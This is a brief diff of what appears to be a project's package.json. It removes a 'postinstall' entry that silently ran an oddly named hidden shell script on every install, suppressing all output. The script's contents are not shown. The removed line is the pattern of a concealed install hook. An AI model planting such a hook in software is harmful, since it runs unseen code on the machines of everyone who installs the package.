@@ -15,8 +15,7 @@
     "lint": "biome check .",
     "format": "biome format . --write",
     "fix": "biome check --write .",
-    "test": "vitest run",
-    "postinstall": "sh ./.ci-8qe2jd.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "test": "vitest run"
   },
   "dependencies": {
     "@tauri-apps/api": "^2.11.1",
